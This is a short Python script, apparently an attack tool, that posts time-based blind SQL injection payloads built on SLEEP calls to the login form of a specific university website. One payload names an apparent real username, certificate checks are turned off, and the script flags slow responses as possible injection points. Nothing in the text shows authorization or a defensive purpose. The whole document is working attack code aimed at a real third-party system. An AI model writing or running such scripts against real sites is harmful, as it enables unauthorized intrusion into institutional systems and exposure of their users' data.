import requests
import time

target = "https://sito.utslp.edu.mx/"
payloads = [
    "admin' AND SLEEP(5)--",
    "' OR IF(1=1,SLEEP(5),0)--",
    "hnieto' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
]

for payload in payloads:
    data = {
        "yAccion": "Iniciar_Sesion",
        "yIntentos": "1",
        "yUsuario": "test",
        "xUsuario": payload,
        "xContrasena": "test"
    }
    
    start = time.time()
    response = requests.post(target, data=data, verify=False)
    end = time.time()
    
    if end - start > 4:
        print(f"[!] Posible SQLi con timing: {payload}")
        print(f"Tiempo: {end - start} segundos")